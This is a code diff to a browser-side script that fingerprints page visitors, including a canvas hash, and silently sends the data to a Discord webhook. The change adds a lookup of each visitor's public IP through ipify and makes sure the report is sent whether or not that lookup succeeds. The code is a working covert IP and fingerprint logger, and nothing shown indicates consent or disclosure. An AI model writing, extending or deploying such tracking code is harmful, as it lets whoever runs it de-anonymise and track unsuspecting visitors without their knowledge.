@@ -72,15 +72,32 @@
     fp.canvas = c.toDataURL("image/png").slice(-64); // tail of the PNG base64
   } catch (_) {}
 
+  // ---- IP (client-side JS can't see its own IP — hit ipify's free endpoint) ----
+  fp.ip = "pending...";
+
   // ---- POST (fire and forget, no response handling) ----
   // sendBeacon defaults to text/plain, which Discord rejects. wrap in a Blob
   // with the right Content-Type so the webhook actually fires.
-  const body = JSON.stringify({ content: "```json\n" + JSON.stringify(fp, null, 2) + "\n```" });
-  try {
-    navigator.sendBeacon(WEBHOOK, new Blob([body], { type: "application/json" }));
-  } catch (_) {
-    try {
-      fetch(WEBHOOK, { method: "POST", headers: { "Content-Type": "application/json" }, body, keepalive: true });
-    } catch (_) {}
-  }
+  //
+  // the IP fetch is async — we POST once it resolves so the payload is complete.
+  fetch("https://api.ipify.org")
+    .then(function(r) { return r.text(); })
+    .then(function(ip) {
+      fp.ip = ip;
+      var body = JSON.stringify({ content: "```json\n" + JSON.stringify(fp, null, 2) + "\n```" });
+      try {
+        navigator.sendBeacon(WEBHOOK, new Blob([body], { type: "application/json" }));
+      } catch (_) {
+        try {
+          fetch(WEBHOOK, { method: "POST", headers: { "Content-Type": "application/json" }, body, keepalive: true });
+        } catch (_) {}
+      }
+    })
+    .catch(function() {
+      // IP fetch failed — send what we have
+      var body = JSON.stringify({ content: "```json\n" + JSON.stringify(fp, null, 2) + "\n```" });
+      try {
+        navigator.sendBeacon(WEBHOOK, new Blob([body], { type: "application/json" }));
+      } catch (_) {}
+    });
 })();
